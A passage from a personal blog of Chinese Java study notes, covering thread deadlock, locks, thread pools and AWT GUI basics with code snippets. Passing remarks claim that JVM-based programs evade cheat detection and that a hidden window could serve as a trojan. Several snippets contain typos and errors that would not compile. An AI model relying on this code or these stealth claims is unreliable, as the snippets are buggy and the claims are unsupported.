class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.gaoji;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;死锁问题</span><br><span class="line">&#x2F;&#x2F;两个线程抱着自己的锁 , 然后想要对方的锁 .</span><br><span class="line">&#x2F;&#x2F; 于是产生一个问题 ---&gt; 死锁</span><br><span class="line">public class DeadLocked &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Makeup g1 &#x3D; new Makeup(0,&quot;白雪公主&quot;);</span><br><span class="line">        Makeup g2 &#x3D; new Makeup(1,&quot;灰姑凉&quot;);</span><br><span class="line"></span><br><span class="line">        new Thread(g1).start();</span><br><span class="line">        new Thread(g2).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;化妆</span><br><span class="line">class Makeup implements Runnable&#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;选择</span><br><span class="line">    int choice;</span><br><span class="line">    &#x2F;&#x2F;谁进来了</span><br><span class="line">    String girlName;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;两个对象</span><br><span class="line">    static LipStick lipStick &#x3D; new LipStick();</span><br><span class="line">    static Mirror mirror &#x3D; new Mirror();</span><br><span class="line"></span><br><span class="line">    public Makeup(int choice,String girlName)&#123;</span><br><span class="line">        this.choice &#x3D; choice;</span><br><span class="line">        this.girlName &#x3D; girlName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        &#x2F;&#x2F;化妆</span><br><span class="line">        try &#123;</span><br><span class="line">            makeup();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;化妆的方法</span><br><span class="line">    public void makeup() throws InterruptedException &#123;</span><br><span class="line">        if (choice&#x3D;&#x3D;0)&#123; &#x2F;&#x2F;先拿口红,再拿镜子</span><br><span class="line">            synchronized (lipStick)&#123;</span><br><span class="line">                System.out.println(&quot;拿到口红&quot;);</span><br><span class="line">                Thread.sleep(1000);</span><br><span class="line">                &#x2F;&#x2F;等待拿镜子的人释放锁</span><br><span class="line">                synchronized (mirror)&#123;</span><br><span class="line">                    System.out.println(&quot;拿到镜子&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;else &#123; &#x2F;&#x2F;先拿镜子 , 再拿口红</span><br><span class="line">            synchronized (mirror)&#123;</span><br><span class="line">                System.out.println(&quot;拿到镜子&quot;);</span><br><span class="line">                Thread.sleep(2000);</span><br><span class="line">                &#x2F;&#x2F;等待拿口红的人释放锁</span><br><span class="line">                synchronized (lipStick)&#123;</span><br><span class="line">                    System.out.println(&quot;拿到口红&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;口红</span><br><span class="line">class LipStick&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;镜子</span><br><span class="line">class Mirror&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>解决方法：把代码块拿出来</p>
-<p>Lock（锁）：JDK5.0开始出现<br>java.util.concurrent.locks.Lock包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import java.util.concurrent.locks.ReentrantLock;</span><br><span class="line"></span><br><span class="line">public class TestLock &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        HelloWorld helloWorld &#x3D; new HelloWorld();</span><br><span class="line"></span><br><span class="line">        new Thread(helloWorld).start();</span><br><span class="line">        new Thread(helloWorld).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class HelloWorld implements Runnable&#123;</span><br><span class="line"></span><br><span class="line">    int ticketNums &#x3D; 100;</span><br><span class="line">    &#x2F;&#x2F;可重入锁</span><br><span class="line">    private final ReentrantLock lock &#x3D; new ReentrantLock();</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        while (true)&#123;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                lock.lock(); &#x2F;&#x2F;加锁</span><br><span class="line">                &#x2F;&#x2F;判断是否有票</span><br><span class="line">                if (ticketNums&gt;0)&#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        Thread.sleep(100);</span><br><span class="line">                    &#125; catch (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println(ticketNums--);</span><br><span class="line">                &#125;else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; finally &#123;</span><br><span class="line">                lock.unlock();&#x2F;&#x2F;解锁</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>线程通信：<br>wait();<br>等待，与sleep不同，会释放锁<br>notify();<br>处于等待唤醒的状态</p>
-<p>线程池：<br>corePoolSize：核心池的大小<br>maximumPoolSize：最大线程数<br>keepAliveTime：线程没有任务时最多保持多长时间后会终止</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import java.util.concurrent.ExecutorService;</span><br><span class="line">import java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;使用线程池</span><br><span class="line">public class ThreadPool&#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;创建一个线程池(池子大小)</span><br><span class="line">        ExecutorService pool &#x3D; Executors.newFixedThreadPool(10);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;执行runnable接口实现类</span><br><span class="line">        pool.execute(new MyThread4());</span><br><span class="line">        pool.execute(new MyThread4());</span><br><span class="line">        pool.execute(new MyThread4());</span><br><span class="line">        pool.execute(new MyThread4());</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;关闭连接池</span><br><span class="line">        pool.shutdown();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyThread4 implements Runnable&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        System.out.println(&quot;MyThread4&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/12/Java-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-Java-GUI笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/11/Java-GUI%E7%AC%94%E8%AE%B0/">Java-GUI笔记</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2022/01/11/Java-GUI%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2022-01-11T02:03:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>很多外挂都用java写，因为java是运行在java虚拟机上（jvm），检测不到，它只能检测到jvm在运行，它又不可能删掉jvm，但是用c写的话它就可以直接检测到exe了</p>
-<p>不过快淘汰了</p>
-<p>GUI核心开发技术：Swing,AWT（不流行原因：界面不美观、需要jre环境）</p>
-<p>学习原因：这是MVC的基础，写带图形界面的小工具，工作时极小概率需要维护swing<br>我：毕竟要学android编程和逆向</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Frame frame&#x3D;new Frame(&quot;我的第一个java图形界面窗口&quot;); &#x2F;&#x2F;设置标题</span><br><span class="line">frame.setVisible(true); &#x2F;&#x2F;设置可见性</span><br><span class="line">frame.setSize(400,400); &#x2F;&#x2F;设置窗口大小</span><br><span class="line">frame.setBackground(new Color(120, 29, 29));&#x2F;&#x2F;设置背景颜色(idea点击数字旁边的颜色块可以直接在色板选色)</span><br><span class="line">frame.setLocation(200,200);&#x2F;&#x2F;弹出的初始位置</span><br><span class="line">frame.setResizable(false);&#x2F;&#x2F;设置大小固定(true就是不固定大小)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;监听事件，监听窗口关闭</span><br><span class="line">&#x2F;&#x2F;适配器模式</span><br><span class="line">frame.addWindowListener(new WindowAdapter() &#123;</span><br><span class="line">    &#x2F;&#x2F;窗口点击关闭的时候需要做的事情</span><br><span class="line">    @Override</span><br><span class="line">    public void windowClosing(WindowEvent e) &#123;</span><br><span class="line">        &#x2F;&#x2F;结束程序</span><br><span class="line">       System.exit(0);&#x2F;&#x2F;返回码为0（正常关闭)，如果为其余数就是错误码</span><br><span class="line">     &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>然后就是可以自己做一个frame</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import java.awt.*;</span><br><span class="line"></span><br><span class="line">public class TestFrame2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        new MyFrame(100,100,200,200)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;监听事件，监听窗口关闭</span><br><span class="line">&#x2F;&#x2F;适配器模式</span><br><span class="line">Myframe.addWindowListener(new WindowAdapter() &#123;</span><br><span class="line">    &#x2F;&#x2F;窗口点击关闭的时候需要做的事情</span><br><span class="line">    @Override</span><br><span class="line">    public void windowClosing(WindowEvent e) &#123;</span><br><span class="line">        &#x2F;&#x2F;结束程序</span><br><span class="line">       System.exit(0);&#x2F;&#x2F;返回码为0（正常关闭)，如果为其余数就是错误码</span><br><span class="line">     &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyFrame extends Frame &#123;</span><br><span class="line">    static int id&#x3D;0; &#x2F;&#x2F;可能存在多可窗口，所以创建一个计数器</span><br><span class="line">    public MyFrame(int x,int y,int w,int h)&#123;</span><br><span class="line">        super(&quot;Myframe&quot;+(++id));&#x2F;&#x2F;调用父类(修改父类）,每new一次id会自增1，然后打印</span><br><span class="line">        setVisible(true); &#x2F;&#x2F;设置可见性</span><br><span class="line">        setSize(w,h); &#x2F;&#x2F;设置窗口大小</span><br><span class="line">        setBackground(new Color(120, 29, 29));&#x2F;&#x2F;设置背景颜色(idea点击数字旁边的颜色块可以直接在色板选色)</span><br><span class="line">        setLocation(x,y);&#x2F;&#x2F;弹出的初始位置</span><br><span class="line">        &#x2F;&#x2F;或者直接用setBounds(x,y,w,h);</span><br><span class="line">        setResizable(false);&#x2F;&#x2F;设置大小固定(true就是不固定大小)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Panel面板：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">import java.awt.*;</span><br><span class="line">import java.awt.event.WindowAdapter;</span><br><span class="line">import java.awt.event.WindowEvent;</span><br><span class="line">import java.awt.event.WindowListener;</span><br><span class="line"></span><br><span class="line">public class TestFrame &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Frame frame &#x3D; new Frame();</span><br><span class="line"></span><br><span class="line">        Panel panel &#x3D; new Panel(); &#x2F;&#x2F;布局</span><br><span class="line"></span><br><span class="line">        frame.setLayout(null); &#x2F;&#x2F;设置布局（不设置这一步会默认置顶）</span><br><span class="line"></span><br><span class="line">        frame.setBounds(200,200,500,500);</span><br><span class="line">        frame.setBackground(new Color(40,161,35));</span><br><span class="line"></span><br><span class="line">        panel.setBounds(50,50,400,400); &#x2F;&#x2F;设置相对坐标（相对于frame）</span><br><span class="line">        panel.setBackground(new Color(193,15,60));</span><br><span class="line"></span><br><span class="line">        frame.add(panel);&#x2F;&#x2F;添加panel到frame</span><br><span class="line"></span><br><span class="line">        frame.setVisible(true); &#x2F;&#x2F;设置可见</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;监听事件，监听窗口关闭</span><br><span class="line">        &#x2F;&#x2F;适配器模式</span><br><span class="line">        frame.addWindowListener(new WindowAdapter() &#123;</span><br><span class="line">            &#x2F;&#x2F;窗口点击关闭的时候需要做的事情</span><br><span class="line">            @Override</span><br><span class="line">            public void windowClosing(WindowEvent e) &#123;</span><br><span class="line">                &#x2F;&#x2F;结束程序</span><br><span class="line">               System.exit(0);&#x2F;&#x2F;返回码为0（正常关闭)，如果为其余数就是错误码</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>按钮</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Frame frame &#x3D; new Frame();</span><br><span class="line">Button button1&#x3D;new Button(&quot;button1&quot;);&#x2F;&#x2F;按钮组件</span><br><span class="line">frame.setLayout(new FlowLayout());&#x2F;&#x2F;设置流式布局（可以加参数），作用就是根据窗口的大小摆放按钮等，比如窗口过小就将按钮自动放到下一排</span><br><span class="line">frame.add(button1);&#x2F;&#x2F;添加按钮</span><br></pre></td></tr></table></figure>
-<p><code>frame.setLayout(new FlowLayout());</code><br>流式布局（截取自：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4a6e5162e4ee">https://www.jianshu.com/p/4a6e5162e4ee</a> ）<br>移动端一般采用流式布局(百分比布局)</p>
-<ol>
-<li>高度定死,宽度自适应</li>
-<li>对于大的轮播图等,宽度100%自适应</li>
-<li>对于小图标挥着文本,一般都是固定宽高大小<br>流式布局的缺点: 对于大屏幕来说,用户体验并不是特别好,有些布局元素会显得很长<br>解决方案: rem布局(宽高自适应)<br>经典的流式布局</li>
-<li>左侧固定,右侧自适应</li>
-<li>右侧固定左侧自适应</li>
-<li>两侧固定,中间自适应(圣杯布局)</li>
-<li>等分布局</li>
-</ol>
-<p>还有“东西南北中”和“表格”的布局</p>
-<p>也可以使用<code>frame.pack();</code>，作用是自动选中最合适的布局</p>
-<p>事件监听</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class TestFrame &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Frame frame &#x3D; new Frame();</span><br><span class="line">        Button button&#x3D;new Button();&#x2F;&#x2F;按钮组件</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;因为addActionListener()需要一个ActionListener，所以我们需要构造一个ActionListener</span><br><span class="line">        MyActionListener myActionListener&#x3D;new MyActionListener();</span><br><span class="line"></span><br><span class="line">        button.addActionListener(myActionListener);&#x2F;&#x2F;监听鼠标运行方法</span><br><span class="line">        frame.setVisible(true);&#x2F;&#x2F;可视化</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyActionListener implements ActionListener&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void actionPerformed(ActionEvent e) &#123;</span><br><span class="line">        System.out.peintln(&quot;aaa&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>文本监听</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TextField textfield &#x3D; new TextField();</span><br><span class="line">frame.add(textfield);&#x2F;&#x2F;创建文本框</span><br><span class="line">textfield.addActionListener();&#x2F;&#x2F;监听文本输入（按下enter触发）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">testfield.setEchoChar(&quot;*&quot;);&#x2F;&#x2F;输入内容全部展示为*，可以用作密码的输入</span><br></pre></td></tr></table></figure>
-<p>然后在所调用的函数（MyActionListener方法的actionPerformed函数）中获取输入内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TextField field &#x3D; (TextField) e.getSource(); &#x2F;&#x2F;获得一些资源</span><br><span class="line">System.out.println(field.getText());&#x2F;&#x2F;打印文本框内输入的内容</span><br></pre></td></tr></table></figure>
-
-<p>画笔paint事件<br>（MyActionListener方法的paint函数）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public void paint(Graphics g)&#123;</span><br><span class="line">	&#x2F;&#x2F;画笔</span><br><span class="line">	g.setColor(Color.red);</span><br><span class="line">	g.drawOval(100,100,100,100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>监听鼠标键盘<br>重写：（类名为MyFrame）<br><code>this.MouseListener(MyMouseListener);</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;适配器模式</span><br><span class="line">private class MyMouseListener extends MouseAdapter&#123;</span><br><span class="line">	@Override</span><br><span class="line">	public void mousePressed(MouseEvent e)&#123; &#x2F;&#x2F;e中存着鼠标按下时的坐标，用e.getX(),e.getY()来取</span><br><span class="line">		MyFrame frame &#x3D; (MyFrame) e.getSource();</span><br><span class="line">		new Point(e.getX(),e.getY());</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-<p>刷新：<code>frame.repaint();</code></p>
-<p>窗口监听：写WindowAdapter类<br>可以用<code>setVisible(false);//隐藏窗口</code>,<code>System.exit(0);//正常退出</code><br>（但是这里用了隐藏窗口之后其实是一直在运行的，但是却无法再打开这个窗口了，而因为java的特性所有的东西都在jvm虚拟机中运行，进程中只会看见一个jvm，完全可以用来当木马来使用）</p>
-<p>键盘监听：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frame.addKeyListener(new KeyAdapter()&#123;</span><br><span class="line">	@Override</span><br><span class="line">	public void keyPressed(KeyEvent e)&#123;</span><br><span class="line">		&#x2F;&#x2F;获得键盘下的键是哪一个</span><br><span class="line">		e.getKeyCode();&#x2F;&#x2F;获取键盘的码</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>（学完p20，后面的实操略）</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/11/Java-GUI%E7%AC%94%E8%AE%B0/">展开全文 >></a>
         </p>
       
 
